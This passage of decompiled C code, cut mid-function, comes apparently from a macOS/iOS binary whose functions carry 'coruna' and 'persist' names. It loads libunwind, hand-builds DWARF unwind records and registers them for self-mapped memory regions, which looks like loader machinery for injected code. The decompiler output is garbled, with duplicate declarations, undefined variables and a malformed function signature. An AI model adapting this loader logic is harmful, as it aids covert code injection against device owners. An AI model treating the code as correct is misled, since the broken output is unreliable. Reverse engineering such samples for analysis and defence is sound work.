                                        }
                                        *(uint *)((long)entry_15 + type_id_18 * 0x10 + 0xc) = tag;
                                      }
                                      *(uint64_t *)(serial_10 + 0x18) = 0;
                                      entry_19 = (long *)((long)entry_15 + type_id_18 * 0x10);
                                      serial_11 = *entry_19;
                                      *(long *)(serial_10 + 0x20) = serial_11;
                                      if (serial_11 != 0) {
                                        *(long *)(serial_11 + 0x18) = serial_10;
                                      }
                                      *entry_19 = serial_10;
                                      serial_10 = serial_13;
                                    }
                                    type_id_16 = type_id_16 + 1;
                                  } while (type_id_16 != type_id_14);
                                }
                                _free(entry_16);
                                entry = *(uint64_t **)entry_18;
                                *(int *)(entry + 1) = *(int *)(entry + 1) << 1;
                                *(int *)((long)entry + 0xc) = *(int *)((long)entry + 0xc) + 1;
                                *entry = entry_15;
                                if (*(uint *)(entry + 2) >> 1 < *(uint *)((long)entry + 0x2c)) {
                                  n = *(int *)(entry + 6);
                                  *(uint *)(entry + 6) = n + 1U;
                                  if (1 < n + 1U) {
                                    *(uint32_t *)((long)entry + 0x34) = 1;
                                  }
                                }
                                else {
                                  *(uint32_t *)(entry + 6) = 0;
                                }
                              }
                            }
                          }
load_ok_36:
                          n = (uint)entry_9[7] * 0x1000000 + -0x61c88647 +
                                   (uint)entry_9[6] * 0x10000 + (uint)entry_9[5] * 0x100 +
                                   (uint)entry_9[4];
                          type_id_12 = (((uint)entry_9[3] * 0x1000000 + -0x60b6453e) - n) +
                                  (uint)entry_9[2] * 0x10000 + (uint)entry_9[1] * 0x100 +
                                  (uint)*entry_9 ^ 0x7f76d;
                          type_id_14 = (n + 0x1124109) - type_id_12 ^ type_id_12 << 8;
                          version = 0xfeedbef7 - (type_id_12 + type_id_14) ^ type_id_14 >> 0xd;
                          type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 0xc;
                          type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 0x10;
                          version = version - (type_id_12 + type_id_14) ^ type_id_14 >> 5;
                          type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 3;
                          type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 10;
                          type_id_12 = version - (type_id_12 + type_id_14) ^ type_id_14 >> 0xf;
                          entry_14 = entry_9 + 0x18;
                          *(byte **)(entry_9 + 0x40) = entry_9;
                          entry_9[0x48] = 8;
                          entry_9[0x49] = 0;
                          entry_9[0x4a] = 0;
                          entry_9[0x4b] = 0;
                          *(uint *)(entry_9 + 0x4c) = type_id_12;
                          entry_18 = k_persist_rodata_word_24590;
                          if (k_persist_rodata_word_24590 == (byte *)0x0) {
                            entry_17 = _calloc(1,0x40);
                            entry_9[0x20] = 0;
                            entry_9[0x21] = 0;
                            entry_9[0x22] = 0;
                            entry_9[0x23] = 0;
                            entry_9[0x24] = 0;
                            entry_9[0x25] = 0;
                            entry_9[0x26] = 0;
                            entry_9[0x27] = 0;
                            entry_9[0x28] = 0;
                            entry_9[0x29] = 0;
                            entry_9[0x2a] = 0;
                            entry_9[0x2b] = 0;
                            entry_9[0x2c] = 0;
                            entry_9[0x2d] = 0;
                            entry_9[0x2e] = 0;
                            entry_9[0x2f] = 0;
                            *(long **)(entry_9 + 0x18) = entry_17;
                            if (entry_17 != (long *)0x0) {
                              entry_17[1] = serial_9;
                              entry_17[3] = (long)entry_14;
                              entry_17[4] = 0x18;
                              entry_15 = _calloc(1,0x200);
                              *entry_17 = (long)entry_15;
                              *(uint32_t *)(entry_17 + 7) = 0xa0111fe1;
                              if (entry_15 != (void *)0x0) {
                                serial_13 = 0;
                                n = 0x20;
                                serial_10 = 0x18;
                                entry_18 = entry_9;
                                entry_19 = entry_17;
                                k_persist_rodata_word_24590 = entry_9;
                                goto load_ok_39;
                              }
                              _free(entry_17);
                            }
                            entry_14[0] = 0;
                            entry_14[1] = 0;
                            entry_14[2] = 0;
                            entry_14[3] = 0;
                            entry_14[4] = 0;
                            entry_14[5] = 0;
                            entry_14[6] = 0;
                            entry_14[7] = 0;
                          }
                          else {
                            entry_19 = *(long **)(k_persist_rodata_word_24590 + 0x18);
                            *(long **)(entry_9 + 0x18) = entry_19;
                            entry_9[0x28] = 0;
                            entry_9[0x29] = 0;
                            entry_9[0x2a] = 0;
                            entry_9[0x2b] = 0;
                            entry_9[0x2c] = 0;
                            entry_9[0x2d] = 0;
                            entry_9[0x2e] = 0;
                            entry_9[0x2f] = 0;
                            entry_17 = *(long **)(entry_18 + 0x18);
                            serial_11 = entry_17[3];
                            serial_10 = entry_17[4];
                            serial_13 = serial_11 - serial_10;
                            *(long *)(entry_9 + 0x20) = serial_13;
                            *(byte **)(serial_11 + 0x10) = entry_9;
                            entry_17[3] = (long)entry_14;
                            n = (int)entry_17[1];
load_ok_39:
                            *(int *)(entry_17 + 2) = (int)entry_17[2] + 1;
                            type_id_16 = (unsigned long)(n - 1U & type_id_12);
                            serial_11 = *entry_17;
                            entry_13 = (long *)(serial_11 + type_id_16 * 0x10);
                            entry_9 = (uint *)(entry_13 + 1);
                            type_id_14 = *entry_9 + 1;
                            *entry_9 = type_id_14;
                            serial_14 = *entry_13;
                            entry_21 = entry_9 + 0x30;
                            entry_21[0] = 0;
                            entry_21[1] = 0;
                            entry_21[2] = 0;
                            entry_21[3] = 0;
                            entry_21[4] = 0;
                            entry_21[5] = 0;
                            entry_21[6] = 0;
                            entry_21[7] = 0;
                            *(long *)(entry_9 + 0x38) = serial_14;
                            if (serial_14 != 0) {
                              *(byte **)(serial_14 + 0x18) = entry_14;
                            }
                            *entry_13 = (long)entry_14;
                            if ((*(int *)(serial_11 + type_id_16 * 0x10 + 0xc) * 10 + 10U <= type_id_14) &&
                               (*(int *)((long)entry_19 + 0x34) == 0)) {
                              version = *(uint *)(entry_19 + 1);
                              entry_15 = _malloc((unsigned long)version << 5);
                              if (entry_15 == (void *)0x0) {
                                *entry_13 = serial_14;
                                serial_11 = *(long *)entry_21;
                                if (serial_11 != 0) {
                                  *(long *)(serial_11 + 0x20) = serial_14;
                                  serial_14 = *(long *)(entry_9 + 0x38);
                                }
                                if (serial_14 != 0) {
                                  *(long *)(serial_14 + 0x18) = serial_11;
                                }
                                *entry_9 = type_id_14;
                                entry_21[0] = 0;
                                entry_21[1] = 0;
                                entry_21[2] = 0;
                                entry_21[3] = 0;
                                entry_21[4] = 0;
                                entry_21[5] = 0;
                                entry_21[6] = 0;
                                entry_21[7] = 0;
                                entry_9[0x38] = 0;
                                entry_9[0x39] = 0;
                                entry_9[0x3a] = 0;
                                entry_9[0x3b] = 0;
                                entry_9[0x3c] = 0;
                                entry_9[0x3d] = 0;
                                entry_9[0x3e] = 0;
                                entry_9[0x3f] = 0;
                                if (serial_13 == 0) {
                                  entry_9 = *(byte **)(entry_9 + 0x28);
                                  if (entry_9 != (byte *)0x0) {
                                    entry_17[3] = serial_10;
                                    entry_17 = *(long **)(entry_9 + 0x18);
                                    k_persist_rodata_word_24590 = entry_9;
                                    goto load_ok_40;
                                  }
                                  _free((void *)**(uint64_t **)(entry_18 + 0x18));
                                  _free(*(void **)(entry_18 + 0x18));
                                  k_persist_rodata_word_24590 = (byte *)0x0;
                                }
                                else {
                                  entry_17[3] = serial_13 + serial_10;
                                  *(uint64_t *)(serial_13 + serial_10 + 0x10) =
                                       *(uint64_t *)(entry_9 + 0x28);
                                  entry_9 = *(byte **)(entry_9 + 0x28);
                                  entry_17 = *(long **)(entry_18 + 0x18);
                                  if (entry_9 != (byte *)0x0) {
load_ok_40:
                                    *(long *)(entry_9 + entry_17[4] + 8) = serial_13;
                                  }
                                  entry = (uint64_t *)
                                            (*entry_17 + (unsigned long)((int)entry_17[1] - 1U & type_id_12) * 0x10
                                            );
                                  *(int *)(entry + 1) = *(int *)(entry + 1) + -1;
                                  if ((byte *)*entry == entry_14) {
                                    *entry = 0;
                                  }
                                  *(int *)(entry_17 + 2) = (int)entry_17[2] + -1;
                                }
                                entry_14[0] = 0;
                                entry_14[1] = 0;
                                entry_14[2] = 0;
                                entry_14[3] = 0;
                                entry_14[4] = 0;
                                entry_14[5] = 0;
                                entry_14[6] = 0;
                                entry_14[7] = 0;
                              }
                              else {
                                _bzero(entry_15,(unsigned long)version << 5);
                                entry_17 = *(long **)entry_14;
                                type_id_14 = *(uint *)(entry_17 + 1);
                                type_id_12 = *(uint *)(entry_17 + 2) >>
                                        (unsigned long)(*(int *)((long)entry_17 + 0xc) + 1U & 0x1f);
                                version = type_id_14 * 2 - 1;
                                if ((version & *(uint *)(entry_17 + 2)) != 0) {
                                  type_id_12 = type_id_12 + 1;
                                }
                                *(uint *)(entry_17 + 5) = type_id_12;
                                *(uint32_t *)((long)entry_17 + 0x2c) = 0;
                                if (type_id_14 == 0) {
                                  entry_16 = (void *)*entry_17;
                                }
                                else {
                                  n = 0;
                                  type_id_16 = 0;
                                  entry_16 = (void *)*entry_17;
                                  do {
                                    serial_10 = *(long *)((long)entry_16 + type_id_16 * 0x10);
                                    while (serial_10 != 0) {
                                      serial_13 = *(long *)(serial_10 + 0x20);
                                      type_id_18 = (unsigned long)(*(uint *)(serial_10 + 0x34) & version);
                                      size = *(int *)((long)entry_15 + type_id_18 * 0x10 + 8) + 1;
                                      *(uint *)((long)entry_15 + type_id_18 * 0x10 + 8) = size;
                                      if (type_id_12 < size) {
                                        n = n + 1;
                                        *(int *)((long)entry_17 + 0x2c) = n;
                                        tag = 0;
                                        if (type_id_12 != 0) {
                                          tag = size / type_id_12;
                                        }
                                        *(uint *)((long)entry_15 + type_id_18 * 0x10 + 0xc) = tag;
                                      }
                                      *(uint64_t *)(serial_10 + 0x18) = 0;
                                      entry_19 = (long *)((long)entry_15 + type_id_18 * 0x10);
                                      serial_11 = *entry_19;
                                      *(long *)(serial_10 + 0x20) = serial_11;
                                      if (serial_11 != 0) {
                                        *(long *)(serial_11 + 0x18) = serial_10;
                                      }
                                      *entry_19 = serial_10;
                                      serial_10 = serial_13;
                                    }
                                    type_id_16 = type_id_16 + 1;
                                  } while (type_id_16 != type_id_14);
                                }
                                _free(entry_16);
                                entry = *(uint64_t **)entry_14;
                                *(int *)(entry + 1) = *(int *)(entry + 1) << 1;
                                *(int *)((long)entry + 0xc) = *(int *)((long)entry + 0xc) + 1;
                                *entry = entry_15;
                                if (*(uint *)(entry + 2) >> 1 < *(uint *)((long)entry + 0x2c)) {
                                  n = *(int *)(entry + 6);
                                  *(uint *)(entry + 6) = n + 1U;
                                  if (1 < n + 1U) {
                                    *(uint32_t *)((long)entry + 0x34) = 1;
                                  }
                                }
                                else {
                                  *(uint32_t *)(entry + 6) = 0;
                                }
                              }
                            }
                          }
load_ok_34:
                          _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
                          goto load_ok_41;
                        }
                        _free(entry_9);
                        type_id_12 = 0xad009;
                      }
                    }
                    else {
                      type_id_12 = 0xad008;
                    }
load_ok_35:
                    _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
                  }
                  else {
                    type_id_12 = -type_id_14;
                    if (-1 < (int)type_id_14) {
                      type_id_12 = type_id_14;
                    }
                    type_id_12 = type_id_12 | 0x40000000;
                  }
                  break;
                }
                } while (0);
                if (type_id_12 != 0) goto load_ok_31;
load_ok_41:
                ___register_frame(fde);
                type_id_12 = (int)type_id_17 + i + 4;
                type_id_17 = (unsigned long)type_id_12;
              } while (type_id_12 < type_id);
load_ok_28:
              type_id_12 = 0;
              *(uint8_t *)(arg + 0x22) = 1;
              *(uint8_t *)(arg + 0x26) = 1;
            }
          }
load_ok_31:
          if ((uint)type_id_19 != 0) {
            type_id_12 = (uint)type_id_19;
          }
          type_id_19 = (unsigned long)type_id_12;
          type_id_9 = type_id_9 + 1;
          if (*(uint *)(arg + 0x1e) <= type_id_9) {
            return type_id_19;
          }
          serial_10 = arg[0x1d];
        } while( true );
      }
    }
  }
  return type_id_9;
}





uint coruna_munmap(long handle)
{
  int *fde;
  long *ptr;
  uint u;
  int err;
  uint size;
  uint version;
  uint64_t *ptr;
  long *buf;
  long handle;
  void *str;
  void *copy;
  unsigned long port;
  long addr;
  void *data;
  uint tag;
  unsigned long kind;
  long off;
  
  if (handle == 0) {
    return 0xad001;
  }
  if (*(char *)(handle + 0xfd) == '\0') {
    return 0;
  }
  addr = *(long *)(handle + 0xe8);
  if (addr == 0) {
    return 0xad00f;
  }
  if (*(int *)(handle + 0xf0) == 0) {
    return 0xad00f;
  }
  port = 0;
  version = 0;
  if (addr == 0) goto fail;
  do {
    ptr = (long *)(addr + port * 0x10);
    off = *ptr;
    size = *(uint *)(ptr + 1);
    tag = 0xad001;
    if (off != 0 && size != 0) {
      kind = 0;
      do {
        fde = (int *)(off + kind);
        err = *fde;
        if (fde[1] != 0) {
          if (fde == (int *)0x0) {
            tag = 0xad001;
            goto done;
          }
          ___deregister_frame(fde);
        }
        tag = (int)kind + err + 4;
        kind = (unsigned long)tag;
      } while (tag < size);
      tag = 0;
    }
done:
    if (*(char *)(addr + port * 0x10 + 0xc) != '\0') {
      _bzero((void *)*ptr,(unsigned long)*(uint *)(ptr + 1));
      _munmap(*ptr,0x4000);
      *ptr = 0;
      ptr[1] = 0;
    }
    while( true ) {
      if (version != 0) {
        tag = version;
      }
      port = port + 1;
      if (*(uint *)(handle + 0xf0) <= port) {
        _bzero(*(void **)(handle + 0xe8),(unsigned long)*(uint *)(handle + 0xf0) << 4);
        _free(*(void **)(handle + 0xe8));
        *(uint64_t *)(handle + 0xe8) = 0;
        *(uint32_t *)(handle + 0xf0) = 0;
        if (k_persist_rodata_word_24590 == (void *)0x0) {
          return tag;
        }
        version = _pthread_mutex_lock((pthread_mutex_t *)&k_persist_rodata_word_24078);
        if (version != 0) {
          tag = -version;
          if (-1 < (int)version) {
            tag = version;
          }
          return tag | 0x40000000;
        }
        copy = k_persist_rodata_word_24590;
        if (k_persist_rodata_word_24590 != (void *)0x0) goto cleanup;
        _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
        return tag;
      }
      addr = *(long *)(handle + 0xe8);
      version = tag;
      if (addr != 0) break;
fail:
      tag = 0xad00f;
    }
  } while( true );
cleanup:
  addr = k_persist_rodata_word_24598;
  data = *(void **)((long)copy + 0x28);
  if (*(long *)((long)copy + 8) == *(long *)(handle + 0x100)) {
    if (k_persist_rodata_word_24598 != 0) {
      err = *(int *)((long)copy + 0x14) + -0x61c88647;
      version = ((uint)*(byte *)((long)copy + 0x13) * 0x1000000 - err) +
              (uint)*(byte *)((long)copy + 0x12) * 0x10000 +
              (uint)*(byte *)((long)copy + 0x11) * 0x100 + (uint)*(byte *)((long)copy + 0x10)
              + 0x9f49bac2 ^ 0x7f76d;
      size = (err - version) + 0x1124109 ^ version << 8;
      u = 0xfeedbef7 - (version + size) ^ size >> 0xd;
      version = version - (size + u) ^ u >> 0xc;
      size = size - (u + version) ^ version << 0x10;
      u = u - (version + size) ^ size >> 5;
      version = version - (size + u) ^ u >> 3;
      size = size - (u + version) ^ version << 10;
      version = u - (version + size) ^ size >> 0xf;
      ptr = *(uint64_t **)(k_persist_rodata_word_24598 + 0x10);
      off = *(long *)((long)*ptr + (unsigned long)(*(int *)(ptr + 1) - 1U & version) * 0x10);
      if (off != 0) {
        handle = ptr[4];
        do {
          str = (void *)(off - handle);
          if (((*(uint *)((long)str + 0x44) == version) && (*(int *)((long)str + 0x40) == 8)) &&
             (**(long **)((long)str + 0x38) == *(long *)((long)copy + 0x10))) {
            off = *(long *)((long)str + 0x18);
            if ((off == 0) && (*(long *)((long)str + 0x20) == 0)) {
              _free((void *)*ptr);
              _free(*(void **)(addr + 0x10));
              k_persist_rodata_word_24598 = 0;
            }
            else {
              if (ptr[3] == (long)str + 0x10) {
                ptr[3] = off + handle;
              }
              if (off == 0) {
                addr = *(long *)((long)str + 0x20);
                k_persist_rodata_word_24598 = addr;
              }
              else {
                *(uint64_t *)(off + handle + 0x10) = *(uint64_t *)((long)str + 0x20);
                addr = *(long *)((long)str + 0x20);
              }
              if (addr != 0) {
                *(long *)(addr + *(long *)(*(long *)(k_persist_rodata_word_24598 + 0x10) + 0x20) + 8) = off;
              }
              buf = *(long **)(k_persist_rodata_word_24598 + 0x10);
              ptr = (long *)(*buf + (unsigned long)((int)buf[1] - 1U & version) * 0x10);
              *(int *)(ptr + 1) = (int)ptr[1] + -1;
              if (*ptr == (long)str + 0x10) {
                *ptr = *(long *)((long)str + 0x30);
              }
              addr = *(long *)((long)str + 0x28);
              if (addr != 0) {
                *(uint64_t *)(addr + 0x20) = *(uint64_t *)((long)str + 0x30);
              }
              if (*(long *)((long)str + 0x30) != 0) {
                *(long *)(*(long *)((long)str + 0x30) + 0x18) = addr;
              }
              *(int *)(buf + 2) = (int)buf[2] + -1;
            }
            _free(str);
            break;
          }
          off = *(long *)((long)str + 0x30);
        } while (off != 0);
      }
    }
    str = k_persist_rodata_word_24590;
    addr = *(long *)((long)copy + 0x20);
    if ((addr == 0) && (*(long *)((long)copy + 0x28) == 0)) {
      _free((void *)**(uint64_t **)((long)k_persist_rodata_word_24590 + 0x18));
      _free(*(void **)((long)str + 0x18));
      k_persist_rodata_word_24590 = (void *)0x0;
    }
    else {
      off = *(long *)((long)k_persist_rodata_word_24590 + 0x18);
      if ((long)copy + 0x18 == *(long *)(off + 0x18)) {
        *(long *)(off + 0x18) = addr + *(long *)(off + 0x20);
      }
      str = *(void **)((long)copy + 0x28);
      if (addr == 0) {
        k_persist_rodata_word_24590 = str;
      }
      else {
        *(uint64_t *)(addr + *(long *)(off + 0x20) + 0x10) =
             *(uint64_t *)((long)copy + 0x28);
      }
      if (str != (void *)0x0) {
        *(long *)((long)str + *(long *)(*(long *)((long)k_persist_rodata_word_24590 + 0x18) + 0x20) + 8) =
             addr;
      }
      buf = *(long **)((long)k_persist_rodata_word_24590 + 0x18);
      ptr = (long *)(*buf +
                       (unsigned long)((int)buf[1] - 1U & *(uint *)((long)copy + 0x4c)) * 0x10);
      *(int *)(ptr + 1) = (int)ptr[1] + -1;
      if (*ptr == (long)copy + 0x18) {
        *ptr = *(long *)((long)copy + 0x38);
      }
      addr = *(long *)((long)copy + 0x30);
      if (addr != 0) {
        *(uint64_t *)(addr + 0x20) = *(uint64_t *)((long)copy + 0x38);
      }
      if (*(long *)((long)copy + 0x38) != 0) {
        *(long *)(*(long *)((long)copy + 0x38) + 0x18) = addr;
      }
      *(int *)(buf + 2) = (int)buf[2] + -1;
    }
    _free(copy);
  }
  copy = data;
  if (data == (void *)0x0) {
    _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24078);
    return tag;
  }
  goto cleanup;
}





uint64_t coruna_init_libunwind(long handle)
{
  long handle;
  int err;
  int *err;
  uint64_t u;
  unsigned long size;
  uint64_t scratch;
  long bootargs;
  
  u = 0xad001;
  if (handle != 0) {
    handle = _dlopen("/usr/lib/system/libunwind.dylib",2);
    if (handle == 0) {
      u = 0x18004;
    }
    else {
      bootargs = 0;
      u = coruna_find_libunwind_image(&bootargs);
      if (((int)u == 0) && (u = 0xad001, bootargs != 0)) {
        err = *(int *)(bootargs + 0x10);
        if (err != 0) {
          err = (int *)(bootargs + 0x20);
          do {
            if (*err == 0x2a) {
              size = *(unsigned long *)(err + 2);
              if (0x1869f0000000000 < size) {
                u = 0x18008;
                goto fail;
              }
              scratch = 0;
              u = coruna_persist_via_macho_open_image(handle,bootargs,0,0x10,&scratch);
              if ((int)u != 0) goto fail;
              if (size - 0xca1900000000 < 0x5760300000000) {
                *(uint32_t *)(handle + 0x118) = 1;
                u = coruna_pthread_mutex_init(handle,handle + 0x120);
                if ((int)u != 0) {
                  coruna_ctx_free(scratch);
                  goto fail;
                }
              }
              else {
                *(uint32_t *)(handle + 0x118) = 0;
              }
              *(long *)(handle + 0x100) = handle;
              *(unsigned long *)(handle + 0x108) = size;
              *(long *)(handle + 0x110) = bootargs;
              return 0;
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            err = err + -1;
          } while (err != 0);
        }
        u = 0xad011;
      }
fail:
      _dlclose(handle);
    }
  }
  return u;
}





uint64_t coruna_bind_foreach(int *flags,void (*val,uint64_t val)
{
  int *err;
  uint u;
  uint size;
  unsigned long version;
  uint32_t *ptr;
  int *status;
  uint64_t port;
  unsigned long tag;
  unsigned long kind;
  
  port = 0xad001;
  if ((flags != (int *)0x0) && (arg != (void (*)0x0)) {
    if ((((unsigned long)flags & 3) == 0) && (*flags == 1)) {
      tag = 0;
      do {
        if ((uint)flags[6] <= tag) {
          return 0;
        }
        status = (int *)((long)flags + tag * 0xc + (unsigned long)(uint)flags[5]);
        if (status == (int *)0x0) {
          return 0xad001;
        }
        if (((unsigned long)status & 3) != 0) {
          return 0xad014;
        }
        version = (unsigned long)(uint)status[1];
        if (status[1] == 0) {
          port = (*arg)(*status,0,0,0,1,val);
        }
        else {
          err = (int *)((long)flags + version);
          if (*err == 3) {
            if (err == (int *)0x0) {
              return 0xad001;
            }
            if (((unsigned long)err & 3) != 0) {
              return 0xad014;
            }
            kind = 0;
            while (kind < *(ushort *)((long)err + 6)) {
              u = *(uint *)((long)flags + kind * 4 + *(ushort *)(err + 1) + version);
              size = u >> 0x18;
              if (size < (uint)flags[2]) {
                ptr = (uint32_t *)((long)flags + (unsigned long)size * 4 + (unsigned long)(uint)flags[1]);
              }
              else {
                ptr = (uint32_t *)
                         ((long)err +
                         (unsigned long)(size - flags[2]) * 4 + (unsigned long)*(ushort *)(err + 2));
              }
              port = coruna_persist_residual_50(flags,status,(u & 0xffffff) + *status,*ptr,arg,
                                   val);
              kind = kind + 1;
              if ((int)port != 0) {
                return port;
              }
            }
          }
          else {
            if (*err != 2) {
              return 0xad014;
            }
            if (err == (int *)0x0) {
              return 0xad001;
            }
            if (((unsigned long)err & 3) != 0) {
              return 0xad014;
            }
            kind = 0xffffffffffffffff;
            while (kind = kind + 1, kind < *(ushort *)((long)err + 6)) {
              if (((int)flags + (int)version + (uint)*(ushort *)(err + 1) & 3) != 0) {
                return 0xad014;
              }
              ptr = (uint32_t *)((long)flags + version + *(ushort *)(err + 1));
              port = coruna_persist_residual_50(flags,status,*ptr,ptr[1],arg,val);
              version = version + 8;
              if ((int)port != 0) {
                return port;
              }
            }
          }
          port = 0;
        }
        tag = tag + 1;
      } while ((int)port == 0);
    }
    else {
      port = 0xad014;
    }
  }
  return port;
}





uint64_t coruna_reallocf(int flags)
{
  long handle;
  uint64_t u;
  uint32_t *ptr;
  void *ptr;
  uint64_t *in_x5;
  long addr;
  
  u = 0xad001;
  if ((flags != 0) && (in_x5 != (uint64_t *)0x0)) {
    ptr = (uint32_t *)*in_x5;
    if (ptr == (uint32_t *)0x0) {
      ptr = _malloc(4);
      *in_x5 = ptr;
      if (ptr == (uint32_t *)0x0) {
        return 0xad009;
      }
      *ptr = 0;
    }
    handle = 0;
    do {
      addr = handle;
      handle = addr + 4;
    } while (*(int *)((long)ptr + addr) != 0);
    ptr = _reallocf(ptr,addr + 8);
    *in_x5 = ptr;
    u = 0xad009;
    if (ptr != (void *)0x0) {
      u = 0;
      ptr = (uint32_t *)((long)ptr + addr + 4);
      ptr[-1] = flags;
      *ptr = 0;
    }
  }
  return u;
}





void coruna_bzero_3(uint size,uint flags_2,uint count_3,uint version_4,uint version_5,long *handle)
{
  uint u;
  bool err;
  bool status;
  bool flags;
  void *ptr;
  uint32_t size;
  uint version;
  unsigned long port;
  unsigned long tag;
  long *buf;
  long handle;
  uint kind;
  uint type_id;
  uint type_id_8;
  char err;
  uint type_id_9;
  uint32_t *ptr;
  uint *buf;
  uint scratch;
  uint8_t bootargs[3];
  uint8_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t serial_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  long action;
  uint *str;
  
  action = *(long *)k_persist_stack_chk_guard_slot;
  tmp_buf = 0;
  serial_buf = 0;
  plist = 0;
  region = 0;
  sa_saved = 0;
  host_info = 0;
  path_buf = 0;
  sa_new = 0;
  action = 0;
  serial_buf = 0;
  stack_guard = 0;
  block_ctx = 0;
  thread_attr = 0;
  _local_b0 = 0;
  host_info = 0;
  thread_attr = 0;
  if (((((((version_5 != 0) || (size == 0)) || (flags_2 == 0)) ||
        ((handle == (long *)0x0 || (*handle == 0)))) ||
       ((handle[1] == 0 ||
        (((int)version_4 < 0 || (port = *(unsigned long *)(*handle + 0x10), port <= size)))))) ||
      (port <= count_3)) || (port <= version_4)) {
    type_id_8 = 0;
    if (flags_2 != 0) {
      type_id_8 = 0xad001;
    }
    kind = 0;
    if ((version_5 & 1) == 0) {
      kind = type_id_8;
    }
    port = (unsigned long)kind;
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(port);
  }
  _local_b0 = 0;
  bootargs = 0;
  thread_attr = 1;
  if (count_3 == 0 && version_4 == 0) {
    thread_attr = 0x527a01;
    port = 0xc;
  }
    else {
      if ((count_3 == 0) && (version_4 != 0)) {
        size = 0x52507a;
        thread_attr = (unsigned long)coruna_cat(size,1);
        port = 0xd;
      }
      else if ((count_3 == 0) || (version_4 != 0)) {
        *(uint8_t *)((uint32_t *)((unsigned long)bootargs | 9) + 1) = 0;
        *(uint32_t *)((unsigned long)bootargs | 9) = 0x524c507a;
        port = 0xe;
      }
      else {
        size = 0x524c7a;
        thread_attr = (unsigned long)coruna_cat(size,1);
        port = 0xd;
      }
    }
done:
  *(uint32_t *)((unsigned long)bootargs | port) = 0x1e7801;
  type_id_8 = (int)port + 3;
  if (version_4 == 0) {
    tag = 1;
  }
  else {
    bootargs[(unsigned long)type_id_8 + 1] = 0x84;
    *(unsigned long *)(bootargs + (unsigned long)type_id_8 + 2) = *(long *)(*handle + 0x100) + (unsigned long)version_4;
    tag = 10;
  }
  if (count_3 != 0) {
    bootargs[tag + type_id_8] = 4;
    tag = (unsigned long)((int)tag + 1);
  }
  bootargs[tag + type_id_8] = 4;
  kind = 0xad001;
  scratch = type_id_8;
  if (type_id_8 < 0x80) {
    kind = 0;
    bootargs[type_id_8] = (char)tag;
    scratch = (int)port + 4;
  }
  scratch = scratch + (int)tag;
  port = (unsigned long)scratch;
  u = flags_2 & 0xf000000;
  if (u == 0x4000000 || u == 0x2000000) {
    if (scratch < 0x7e) {
      err = false;
      type_id_9 = 0;
      bootargs[(unsigned long)scratch + 2] = 0;
      *(uint16_t *)(bootargs + scratch) = 0x1f0c;
      scratch = scratch + 3;
      port = (unsigned long)scratch;
    }
    else {
      err = false;
      type_id_9 = 0xad00c;
    }
  }
  else if (u == 0x3000000) {
    type_id_9 = 0;
    err = true;
  }
  else {
    err = false;
    type_id_9 = 0xad014;
  }
  version = (uint)port;
  if (0x7f < type_id_8) {
    type_id_9 = kind;
  }
  ptr = (uint32_t *)(bootargs + port);
  if (ptr < (uint32_t *)((unsigned long)(bootargs + port + 7) & 0xfffffffffffffff8)) {
    port = (unsigned long)scratch;
    do {
      *(uint8_t *)ptr = 0;
      version = (int)port + 1;
      port = (unsigned long)version;
      ptr = (uint32_t *)(bootargs + port);
      scratch = version;
    } while (ptr < (uint32_t *)((unsigned long)(bootargs + port + 7) & 0xfffffffffffffff8));
  }
  _local_b0 = coruna_u64_pack((bootargs), (version - 4));
  *ptr = 0;
  *(uint *)(bootargs + (scratch + 4)) = scratch + 4;
  buf = (uint *)handle[1];
  port = *(long *)(*handle + 0x100) + (unsigned long)size;
  *(unsigned long *)(bootargs + (scratch + 8)) = port;
  do {
    str = buf + 1;
    type_id_8 = *buf;
    buf = str;
  } while (type_id_8 != 0 && type_id_8 != size);
  if (((type_id_8 == 0) ||
      (type_id_8 = *str, kind = type_id_8 - size, tag = (unsigned long)kind, type_id = type_id_9,
      type_id_8 < size || kind == 0)) && (tag = port, type_id = 0xad014, type_id_9 != 0)) {
    type_id = type_id_9;
  }
  *(unsigned long *)(bootargs + (scratch + 0x10)) = tag;
  type_id_8 = scratch + 0x18;
  if (count_3 == 0) {
    if (type_id_8 < 0x80) {
      kind = 0;
      bootargs[type_id_8] = 0;
      type_id_8 = scratch + 0x19;
    }
    else {
      kind = 0xad001;
    }
    scratch = type_id_8;
    if (type_id != 0) {
      kind = type_id;
    }
  }
  else {
    if (type_id_8 < 0x80) {
      kind = 0;
      bootargs[type_id_8] = 8;
      type_id_8 = scratch + 0x19;
    }
    else {
      kind = 0xad001;
    }
    if (type_id != 0) {
      kind = type_id;
    }
    *(unsigned long *)(bootargs + type_id_8) = *(long *)(*handle + 0x100) + (unsigned long)count_3;
    scratch = type_id_8 + 8;
  }
  if (u == 0x2000000) {
    bootargs[scratch] = 0xe;
    type_id_8 = scratch + 1;
    if (type_id_8 < 0x80) {
      type_id_9 = flags_2 >> 8 & 0xfff0;
      port = (unsigned long)type_id_9;
      type_id = flags_2 >> 8 & 0x70;
      tag = (unsigned long)type_id;
      bootargs[type_id_8] = (char)type_id;
      scratch = scratch + 2;
      status = 0x7f < type_id_9;
      if ((status) && (type_id_8 = scratch, scratch != 0x80)) {
        do {
          bootargs[type_id_8 - 1] = (byte)tag | 0x80;
          tag = port >> 7 & 0x7f;
          bootargs[type_id_8] = (char)tag;
          scratch = type_id_8 + 1;
          status = 0x3fff < port;
          if (!status) break;
          port = port >> 7;
          flags = type_id_8 != 0x7f;
          type_id_8 = scratch;
        } while (flags);
      }
      type_id_8 = 0;
      if (status) {
        type_id_8 = 0xad00c;
      }
      err = '\x01';
    }
    else {
      scratch = type_id_8;
      type_id_8 = 0xad001;
    }
  }
  if (u == 0x4000000) {
